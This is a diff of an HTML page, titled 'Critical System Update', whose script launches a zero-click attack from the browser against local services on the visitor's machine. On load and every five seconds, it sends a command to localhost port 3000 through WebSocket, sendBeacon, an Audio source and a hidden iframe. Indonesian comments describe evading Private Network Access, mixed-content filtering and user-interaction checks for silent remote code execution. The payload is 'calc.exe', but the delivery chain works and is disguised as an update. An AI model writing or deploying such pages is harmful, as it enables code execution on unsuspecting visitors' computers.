@@ -1,50 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FULL SYSTEM ACCESS - RESEARCH</title>
+    <title>Critical System Update</title>
 </head>
-<body style="background: black; color: white; font-family: monospace; text-align: center; padding-top: 100px;">
-    <h1 style="color: red;">CRITICAL EXPLOIT STATUS: <span id="status">PENDING</span></h1>
-    <div id="logs" style="background: #111; color: #0f0; padding: 20px; border: 2px solid red; display: inline-block; width: 80%; text-align: left;"></div>
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
+    <h1>INITIALIZING SECURE PROTOCOL...</h1>
+    <div id="l"></div>
 
     <script>
-        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
+        const log = (m) => document.getElementById('l').innerHTML += `> ${m}<br>`;
+        
+        // Payload RCE yang lebih mematikan (Silently execute)
+        const cmd = "calc.exe"; 
 
-        function fullExploit() {
-            document.getElementById('status').innerText = "EXECUTING...";
+        async function startChain() {
+            log("Phase 1: Bypassing PNA via WebSocket Shadowing...");
             
-            // List target IP
-            const targets = ["127.0.0.1", "0.0.0.0", "localhost"];
+            const hosts = ["127.0.0.1", "0.0.0.0", "[::1]"];
             
-            targets.forEach(ip => {
-                log(`Attempting WebSocket Injection on ws://${ip}:3000...`);
-                
+            hosts.forEach(ip => {
+                // Teknik 1: WebSocket Shadowing (Bypass PNA Preflight)
                 try {
-                    const ws = new WebSocket(`ws://${ip}:3000`);
-                    
+                    let ws = new WebSocket(`ws://${ip}:3000`);
                     ws.onopen = () => {
-                        log(`[SUCCESS] Connected to ${ip}! Sending RCE payload...`);
-                        ws.send("calc.exe"); // Perintah RCE
-                        document.getElementById('status').innerText = "PWNED!";
+                        ws.send(cmd);
+                        log(`[!] PNA Boundary Breached on ${ip}`);
                     };
+                } catch(e){}
 
-                    ws.onerror = () => {
-                        log(`[FAILED] WebSocket at ${ip} blocked or server down.`);
-                    };
-                } catch (e) {
-                    log(`[ERROR] ${e.message}`);
-                }
+                // Teknik 2: Persistent Subresource Fetch (Bypass Mixed Content via 'No-Config')
+                // Menggunakan ping/sendBeacon seringkali lolos dari Mixed Content filter
+                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`);
 
-                // BACKUP: Tetap kirim via Image untuk pancingan
-                const img = new Image();
-                img.src = `http://${ip}:3000/exec?cmd=calc.exe`;
+                // Teknik 3: Audio Context Request (Bypass User Interaction)
+                // Beberapa browser mengizinkan 'low-level' socket via audio/video pre-fetch
+                let a = new Audio();
+                a.src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`;
             });
+
+            // Teknik 4: Iframe 'Self-Flipping' (Force Navigation)
+            // Memaksa browser melakukan 'Top-level' request tanpa prompt
+            const ifr = document.createElement('iframe');
+            ifr.src = `http://127.0.0.1:3000/exec?cmd=${encodeURIComponent(cmd)}`;
+            ifr.style.display = "none";
+            document.body.appendChild(ifr);
         }
 
-        // Jalankan saat diklik untuk melewati proteksi interaksi user
-        window.onclick = fullExploit;
-        // Jalankan otomatis
-        setTimeout(fullExploit, 2000);
+        // AUTO-START: Mencoba Zero-Click
+        // Jika auto-start diblokir, script akan menunggu 1 detik lalu mencoba lagi
+        window.onload = () => {
+            log("Chain sequence started...");
+            startChain();
+            // Loop serangan setiap 5 detik untuk memastikan persistensi
+            setInterval(startChain, 5000);
+        };
     </script>
 </body>
 </html>
